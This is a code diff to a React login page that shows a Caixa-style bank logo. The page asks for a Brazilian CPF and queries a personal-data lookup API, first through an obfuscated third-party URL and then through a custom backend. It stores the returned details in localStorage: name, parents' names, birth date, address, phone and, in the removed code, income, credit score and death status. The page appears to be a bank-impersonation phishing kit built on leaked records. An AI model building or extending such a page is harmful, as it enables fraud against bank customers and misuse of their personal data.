@@ -3,10 +3,9 @@ import axios from "axios";
 import logo from "../assets/caixa.webp";
 import userIcon from "../assets/user.png";
 
-// Define the API instance with the new endpoint
-// eslint-disable-next-line react-refresh/only-export-components
+// API ajustada para a que criamos no backend
 export const api = axios.create({
-    baseURL: "https://x-search.xyz/3nd-p01n75/xsiayer0-0t/rxe404r020125/r0070x/01",
+    baseURL: "https://api-consulta-jdem.onrender.com/", // ou sua URL de produção
 });
 
 export function Login() {
@@ -14,7 +13,6 @@ export function Login() {
     const [isLoading, setIsLoading] = useState<boolean>(false);
     const [errorMessage, setErrorMessage] = useState<string>("");
 
-    // Function to apply CPF mask and restrict input to 11 digits
     const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
         let value = event.target.value.replace(/\D/g, "");
         if (value.length > 11) value = value.slice(0, 11);
@@ -26,7 +24,6 @@ export function Login() {
         setCpf(value);
     };
 
-    // Function to fetch data from the API using CPF
     const handleNext = async () => {
         if (cpf.length < 14) {
             setErrorMessage("Por favor, insira um CPF válido.");
@@ -34,46 +31,50 @@ export function Login() {
         }
 
         setIsLoading(true);
-        setErrorMessage(""); // Clear previous error messages
+        setErrorMessage("");
 
         try {
-            const response = await api.get(`/cpf.php?cpf=${cpf.replace(/\D/g, "")}`);
+            // Chamada ajustada para o backend NestJS
+            const response = await api.get(`/information/basic`, {
+                params: { cpf: cpf.replace(/\D/g, "") },
+            });
 
+            console.log(response.data.data.resultado)
 
+            // response.data já vem no formato ResponseDto
+            const userData = response?.data.data.resultado;
 
-            // Check if response is successful and contains data
-            if (response.data?.status === 1 && response.data.dados?.length > 0) {
-                const userData = response.data.dados[0];
+            if (userData) {
+                // Salva no localStorage
+                localStorage.setItem(
+                    "userData",
+                    JSON.stringify({
+                        nome: userData.nome,
+                        cpf: userData.cpf,
+                        dataNascimento: userData.nascimento,
+                        nomeMae: userData.mae,
+                        sexo: userData.sexo,
+                        endereco: userData.endereco,
+                        numero: userData.endereco.numero,
+                        bairro: userData.endereco.bairro,
+                        cidade: userData.endereco.cidade,
+                        estado: userData.endereco.estado,
+                        pais: userData.endereco.pais,
+                        cep: userData.endereco.cep,
+                        telefone: userData.telefone.numero,
+                        pai: userData.pai,
+                        signo: userData.signo,
+                        idade: userData.idade,
+                    }),
+                );
 
-                const stringCPF = cpf.replace(/\D/g, "")
-
-
-
-                // Save user data to localStorage
-                localStorage.setItem("userData", JSON.stringify({
-                    nome: userData.Nome,
-                    cpf: stringCPF,
-                    dataNascimento: userData.Data_Nascimento,
-                    nomeMae: userData.Nome_Mae,
-                    sexo: userData.Sexo,
-                    renda: userData.Renda,
-                    score: userData.Score,
-                    endereco: userData.Endereco,
-                    numero: userData.Numero,
-                    bairro: userData.Bairro,
-                    cidade: userData.Cidade,
-                    estado: userData.Estado,
-                    obito: userData.Obito
-                }));
-
-                // Redirect after successful fetch
                 window.location.href = "/carregando";
             } else {
                 setErrorMessage("CPF não encontrado. Verifique e tente novamente.");
             }
-            // eslint-disable-next-line @typescript-eslint/no-unused-vars
         } catch (error) {
             setErrorMessage("Erro ao buscar dados. Tente novamente mais tarde.");
+            console.error("Erro ao chamar API:", error);
         } finally {
             setIsLoading(false);
         }
@@ -92,7 +93,6 @@ export function Login() {
                 </h1>
             </div>
 
-            {/* CPF Input */}
             <div className="flex items-center space-x-2">
                 <img src={userIcon} alt="user" width={15} />
                 <input
@@ -105,13 +105,15 @@ export function Login() {
                 />
             </div>
 
-            {/* Error Message */}
             {errorMessage && <p className="text-red-600">{errorMessage}</p>}
 
-            {/* Next Button */}
             <button
                 onClick={handleNext}
-                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${isLoading ? "bg-orange-500 cursor-not-allowed transform scale-90" : "bg-orange-400 hover:scale-105"}`}
+                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${
+                    isLoading
+                        ? "bg-orange-500 cursor-not-allowed transform scale-90"
+                        : "bg-orange-400 hover:scale-105"
+                }`}
                 disabled={isLoading}
             >
                 {isLoading ? (
